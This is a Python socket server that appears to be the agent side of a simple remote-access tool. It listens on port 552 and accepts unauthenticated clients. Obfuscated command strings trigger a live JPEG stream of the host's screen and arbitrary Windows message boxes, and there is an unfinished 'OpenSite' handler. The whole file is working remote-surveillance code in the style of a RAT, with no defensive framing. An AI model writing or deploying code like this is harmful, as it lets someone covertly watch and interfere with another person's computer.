import socket
import threading
import cv2
import mss
import numpy as np

# Sunucu
VADR = "192.168.0.3"
VPRT = 552

vsc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
vsc.bind((VADR, VPRT))
vsc.listen()

print("Server is listening on {}:{}".format(VADR, VPRT))

def handle_client(conn, addr):
    print(f"Connected by {addr}")
    svmsg = "Success!\nServer version: 1.3"
    conn.send(svmsg.encode())

    while True:
        try:
            commandput = conn.recv(1024).decode()

            if commandput == "xvkso_Qwxksexvzz":
                conn.send("Suc1".encode())
                cmdcom = conn.recv(1024).decode()

                if cmdcom == "OpenSite":
                    pass
                elif cmdcom == "":
                    pass

            elif commandput == "xWERxq2312fttl_qrs":
                options = {"top": 40, "left": 0, "width": 1280, "height": 1024}
                conn.send("suc1".encode())
                fps_vl = conn.recv(1024).decode()
                fpsValue = int(fps_vl)

                if fpsValue > 60:
                    fpsValue = 25
                elif fpsValue < 10:
                    fpsValue = 15

                conn.send("Press 'q' and stop live screen.".encode())

                with mss.mss() as sct:
                    monitor = {"top": 40, "left": 0, "width": 1280, "height": 1024}
                    try:
                        while True:
                            frame = np.array(sct.grab(monitor))
                            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 100]  # JPEG quality (0-100)
                            result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
                            if result:
                                data = encoded_frame.tobytes()
                                conn.sendall(len(data).to_bytes(4, byteorder='big') + data)
                    except Exception as e:
                        print(f"Client {addr} disconnected: {e}")

            elif commandput == "ftqwrxzLpssmtrnszx_pxvbq":
                conn.send("suc1".encode())
                msgTitlede = conn.recv(1024)
                conn.send("suc2".encode())
                msgContentde = conn.recv(1024)

                msgTitle = msgTitlede.decode()
                msgContent = msgContentde.decode()

                print("Received message box command")
                print(f"Title: {msgTitle}")
                print(f"Content: {msgContent}")

                import ctypes
                MB_YESNO = 0x04
                ICON_STOP = 0x10

                def mess():
                    ctypes.windll.user32.MessageBoxW(0, msgContent, msgTitle, MB_YESNO | ICON_STOP)

                threading.Thread(target=mess).start()

                conn.send(f"MsgBox Runned.\nTitle:{msgTitle}\nContent:{msgContent}".encode())

        except Exception as e:
            print(f"Error: {e}")
            break

    conn.close()

while True:
    conn, addr = vsc.accept()
    threading.Thread(target=handle_client, args=(conn, addr)).start()
